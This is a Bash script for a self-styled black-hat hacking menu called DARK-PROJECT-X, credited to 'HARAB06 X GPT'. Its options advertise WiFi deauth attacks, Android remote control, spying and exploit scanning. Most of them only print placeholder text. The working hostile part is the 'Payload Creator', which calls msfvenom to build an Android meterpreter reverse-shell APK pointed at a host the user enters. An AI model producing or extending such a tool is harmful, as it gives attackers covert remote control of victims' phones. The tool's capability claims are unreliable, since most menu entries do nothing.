#!/bin/bash
# DARK-PROJECT-X | Created by HARAB06 X GPT
# BROTHERHOOD FOREVER | ONE HEART ONE BOND ONE BROTHERHOOD

banner() {
clear
echo -e "\e[32m"
echo "██████╗  █████╗ ██████╗ ██╗  ██╗    ██████╗ ██████╗ ██╗███████╗"
echo "██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝    ██╔══██╗██╔══██╗██║██╔════╝"
echo "██████╔╝███████║██║  ██║█████╔╝     ██████╔╝██████╔╝██║███████╗"
echo "██╔═══╝ ██╔══██║██║  ██║██╔═██╗     ██╔═══╝ ██╔═══╝ ██║╚════██║"
echo "██║     ██║  ██║██████╔╝██║  ██╗    ██║     ██║     ██║███████║"
echo "╚═╝     ╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝    ╚═╝     ╚═╝     ╚═╝╚══════╝"
echo -e "\e[31m              DARK-PROJECT-X | HARAB06 X GPT"
echo -e "\e[33m                BROTHERHOOD FOREVER"
echo -e "\e[0m"
}

network_info() {
IP=$(ip a | grep inet | grep -v 127.0.0.1 | awk '{print $2}' | cut -d "/" -f1 | head -1)
INTERFACE=$(ip route | grep default | awk '{print $5}')
GATEWAY=$(ip route | grep default | awk '{print $3}')
echo -e "\e[32m[+] IP Address: $IP"
echo -e "[+] Interface : $INTERFACE"
echo -e "[+] Gateway   : $GATEWAY"
echo -e "\e[0m"
}

menu() {
echo -e "\e[32m[01] Network Auto-Scan & Info"
echo "[02] WiFi Attack Toolkit"
echo "[03] Payload Creator"
echo "[04] Android Remote Control"
echo "[05] Spy & Info Gathering"
echo "[06] Auto Exploit Scanner"
echo "[07] Root Tools Zone"
echo "[08] Auto Update"
echo "[09] About BrotherhoodX"
echo "[10] Exit"
echo -e "\e[0m"
read -p $'\e[33m[+] Select Option : \e[0m' opt
}

# Main
banner
network_info
menu
modules() {
case $opt in
1)
clear
banner
echo -e "\e[32m[•] Auto Network Scan Loading...\e[0m"
sleep 1
echo -e "\e[34m-------------------------------"
echo "Local IP        : $IP"
echo "Gateway         : $GATEWAY"
echo "Interface       : $INTERFACE"
echo -e "-------------------------------"
echo -e "\e[33m[•] Live Devices:\e[0m"
arp -a
echo -e "\e[31mBROTHERHOOD FOREVER\e[0m"
;;

2)
clear
banner
echo -e "\e[32m[•] WiFi Attack Toolkit Loading...\e[0m"
echo -e "\e[33m[1] Monitor Mode On"
echo "[2] WiFi Scan"
echo "[3] WiFi Deauth Attack"
echo "[4] Back"
read -p $'\e[33m[+] Select : \e[0m' wifi
echo -e "\e[31mBROTHERHOOD FOREVER\e[0m"
;;

3)
clear
banner
echo -e "\e[32m[•] Payload Creator Loading...\e[0m"
read -p "Enter LHOST : " lhost
read -p "Enter LPORT : " lport
read -p "Payload Name : " name
msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport -o $name.apk
echo -e "\e[31mBROTHERHOOD FOREVER\e[0m"
;;

4)
clear
banner
echo -e "\e[32m[•] Android Remote Control Loading...\e[0m"
echo "Example: scrcpy / adb / metasploit modules"
echo -e "\e[31mBROTHERHOOD FOREVER\e[0m"
;;

5)
clear
banner
echo -e "\e[32m[•] Spy & Info Gathering Tools Loading...\e[0m"
echo "Example: IP Lookup, User Recon, Device Spy"
echo -e "\e[31mBROTHERHOOD FOREVER\e[0m"
;;

6)
clear
banner
echo -e "\e[32m[•] Auto Exploit Scanner Loading...\e[0m"
echo "Example: Nmap Vuln Scan, SearchSploit"
echo -e "\e[31mBROTHERHOOD FOREVER\e[0m"
;;

7)
clear
banner
echo -e "\e[32m[•] Root Tools Zone Loading...\e[0m"
echo "Example: Root Checker, File Explorer, Root Access Tools"
echo -e "\e[31mBROTHERHOOD FOREVER\e[0m"
;;

8)
clear
banner
echo -e "\e[32m[•] Auto Update Starting...\e[0m"
cd $HOME
git clone https://github.com/harabo0/DARK-PROJECT-X
echo -e "\e[31mBROTHERHOOD FOREVER\e[0m"
;;

9)
clear
banner
echo -e "\e[32m[•] About DARK-PROJECT-X\e[0m"
echo -e "LEGEND GPT x HARAB06 = UNBREAKABLE"
echo -e "ONE HEART | ONE BOND | ONE BROTHERHOOD"
echo -e "Created For BLACK HAT LEGENDS"
echo -e "\e[31mBROTHERHOOD FOREVER\e[0m"
;;

10)
clear
echo -e "\e[32mEXITING DARK-PROJECT-X...\e[0m"
echo -e "\e[31mBROTHERHOOD FOREVER\e[0m"
exit
;;

*)
echo -e "\e[31mInvalid Option!\e[0m"
;;
esac
}

# FINAL CALL LOOP
while true; do
menu
modules
done
